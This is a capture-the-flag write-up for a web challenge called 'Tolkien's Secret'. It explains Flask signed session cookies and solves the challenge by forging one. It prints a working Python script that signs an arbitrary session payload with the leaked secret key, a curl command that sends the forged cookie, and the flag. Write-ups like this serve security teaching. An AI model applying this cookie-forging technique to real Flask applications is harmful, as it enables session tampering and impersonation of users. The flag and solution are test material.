# Tolkien's Secret

> Points: 150

> Category: Web

## Description

One Flag to rule them all, One Flag to find them,

One Flag to bring them all, and in the darknes bind them.

Note: I want to make it abundantly clear that you will not need to use any tools that make automated requests (bruteforce, dirb, etc.) to solve this.

## Attachments

https://dismalwindingcircles.samwise74.repl.co/

## Solution

In order to get the flag, we need to set the cookie on the `/count` route equal to 356047916789627241981541. The value of the cookie increments by one each time you revisit the page, but obviously we're not going to reload the page 356047916789627241981541 times.

This is how a flask signed cookie is structured

![flaskCookieParts](https://miro.medium.com/max/1000/1*EBExwdWx4ma2CQBgsUfHwA.png)

Kinda looks similar to a jwt. Just like a jwt, we can change the payload (session data) since it's just a base64 encoded string.

The cryptographic hash is what makes the cookie secure. It's a SHA1 hash that's based off the session data, timestamp, and the secret key.

We already know what the secret key is because it's right at the top of the website. SECRETKEY = **KeepItSecret**.

Below is a python script that will forge a new session cookie.

```py
from flask.sessions import SecureCookieSessionInterface

payload = { 'count': 356047916789627241981541 }
secret = "KeepItSecret"

class FakeApp():
    def __init__(self, secret_key):
        self.secret_key = secret_key

def encode(payload, secret):
    app = FakeApp(secret)
    return SecureCookieSessionInterface().get_signing_serializer(app).dumps(payload)

print(encode(payload, secret))
```

Running the program outputs: `eyJjb3VudCI6MzU2MDQ3OTE2Nzg5NjI3MjQxOTgxNTQxfQ.YFvcOQ.SYZya8a592erbFrCj3qV7npM448`

Send the cookie to the `/count` route and it will give the flag.

```sh
$ curl -Lv -b session=eyJjb3VudCI6MzU2MDQ3OTE2Nzg5NjI3MjQxOTgxNTQxfQ.YFvcOQ.SYZya8a592erbFrCj3qV7npM448 https://dismalwindingcircles.samwise74.repl.co/count
```

### Flag

> ictf{Come_on_Mr_Frodo_I_cant_carry_it_for_you_but_I_can_carry_you!}
